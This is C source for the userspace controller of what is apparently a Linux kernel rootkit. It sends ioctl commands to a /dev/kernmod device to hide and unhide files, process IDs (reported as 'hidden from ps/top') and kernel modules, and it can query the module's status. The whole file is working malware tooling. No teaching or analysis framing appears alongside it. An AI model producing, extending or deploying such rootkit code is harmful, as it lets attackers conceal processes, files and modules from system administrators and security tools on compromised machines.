#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>

#include "common.h"

int main(int argc, char *argv[])
{
    if (argc < 2) {
        return 1;
    }

    int fd = open("/dev/kernmod", O_RDWR);

    if (fd < 0) {
        perror("open /dev/kernmod");
        if (errno == ENOENT)
            fprintf(stderr, "Is the kernel module loaded? Try: sudo insmod kernmod.ko\n");
        else if (errno == EACCES)
            fprintf(stderr, "Permission denied. Try running with sudo.\n");
        return 1;
    }

    char buf[MAX_HIDDEN_NAME] = {0};
    int ret = 0; 

    if (strcmp(argv[1], "hide-file") == 0) {
        if (argc < 3) {
            fprintf(stderr, "Error: filename required\n");
            close(fd);
            return 1;
        }
        strncpy(buf, argv[2], sizeof(buf) - 1);
        buf[MAX_HIDDEN_NAME - 1] = '\0';
        
        ret = ioctl(fd, IOCTL_HIDE_FILE, buf);
        if (ret < 0) {
            if (errno == EEXIST)
                fprintf(stderr, "File '%s' is already hidden\n", argv[2]);
            else
                perror("ioctl HIDE_FILE failed");
        } else {
            printf("File '%s' is now hidden\n", argv[2]);
        }

    } else if (strcmp(argv[1], "unhide-file") == 0) {
        if (argc < 3) {
            fprintf(stderr, "Error: filename required\n");
            close(fd);
            return 1;
        }
        strncpy(buf, argv[2], sizeof(buf) - 1);

        ret = ioctl(fd, IOCTL_UNHIDE_FILE, buf);
        if (ret < 0) {
            if (errno == ENOENT)
                fprintf(stderr, "File '%s' is not in the hidden list\n", argv[2]);
            else
                perror("ioctl UNHIDE_FILE failed");
        } else {
            printf("File '%s' is now visible\n", argv[2]);
        }

    } else if (strcmp(argv[1], "hide-pid") == 0) {
        if (argc < 3) {
            fprintf(stderr, "Error: PID required\n");
            close(fd);
            return 1;
        }
        // validation
        long pid = strtol(argv[2], NULL, 10);
        if (pid <= 0) {
            fprintf(stderr, "Error: invalid PID '%s'\n", argv[2]);
            close(fd);
            return 1;
        }

        memset(buf, 0, sizeof(buf));
        snprintf(buf, sizeof(buf), "%ld", pid);

        ret = ioctl(fd, IOCTL_HIDE_PID, buf);
        if (ret < 0) {
            if (errno == EEXIST)
                fprintf(stderr, "PID '%s' is already hidden\n", argv[2]);
            else
                perror("ioctl HIDE_PID failed");
        } else {
            printf("PID '%s' is now hidden from ps/top\n", argv[2]);
        }

    } else if (strcmp(argv[1], "unhide-pid") == 0) {
        if (argc < 3) {
            fprintf(stderr, "Error: PID required\n");
            close(fd);
            return 1;
        }
        long pid = strtol(argv[2], NULL, 10);
        if (pid <= 0) {
            fprintf(stderr, "Error: invalid PID '%s'\n", argv[2]);
            close(fd);
            return 1;
        }
        memset(buf, 0, sizeof(buf));
        snprintf(buf, sizeof(buf), "%ld", pid);

        ret = ioctl(fd, IOCTL_UNHIDE_PID, buf);
        if (ret < 0) {
            if (errno == ENOENT)
                fprintf(stderr, "PID '%s' is not in the hidden list\n", argv[2]);
            else
                perror("ioctl UNHIDE_PID failed");
        } else {
            printf("PID '%s' is now visible\n", argv[2]);
        }

    } else if (strcmp(argv[1], "hide-module") == 0) {
        if (argc < 3) {
            fprintf(stderr, "Error: module name required\n");
            close(fd);
            return 1;
        }
        memset(buf, 0, sizeof(buf));
        strncpy(buf, argv[2], 63);

        ret = ioctl(fd, IOCTL_HIDE_MODULE, buf);
        if (ret < 0) {
            if (errno == EEXIST)
                fprintf(stderr, "Module '%s' is already hidden\n", argv[2]);
            else if (errno == ENOENT) 
                fprintf(stderr, "Module '%s' not found\n", argv[2]);
            else 
                perror("ioctl HIDE_MODULE failed");
        } else {
            printf("Module '%s' is now hidden\n", argv[2]);
        }

    } else if (strcmp(argv[1], "unhide-module") == 0) {
        if (argc < 3) { 
            fprintf(stderr, "Error: module name required\n"); close(fd);
            return 1;
        }
        memset(buf, 0, sizeof(buf));
        strncpy(buf, argv[2], 63);

        ret = ioctl(fd, IOCTL_UNHIDE_MODULE, buf);
        if (ret < 0) {
            if (errno == ENOENT) 
                fprintf(stderr, "Module '%s' is not in hidden list\n", argv[2]);
            else 
                perror("ioctl HIDE_MODULE failed");
        } else {
            printf("Module '%s' is now visible\n", argv[2]);
        }

    } else if (strcmp(argv[1], "status") == 0) {
        char buffer[4096];
        struct kernmod_status_request req = {
            .buf = buffer,
            .buf_size = sizeof(buffer),
            .out_len = 0
        };

        ret = ioctl(fd, IOCTL_GET_STATUS, &req);
        if (ret == 0) {
            write(STDOUT_FILENO, buffer, req.out_len);
        }

    } else {
        fprintf(stderr, "Unknown command: %s\n", argv[1]);
        close(fd);
        return 1;
    }

    close(fd);
    return (ret < 0) ? 1 : 0;
}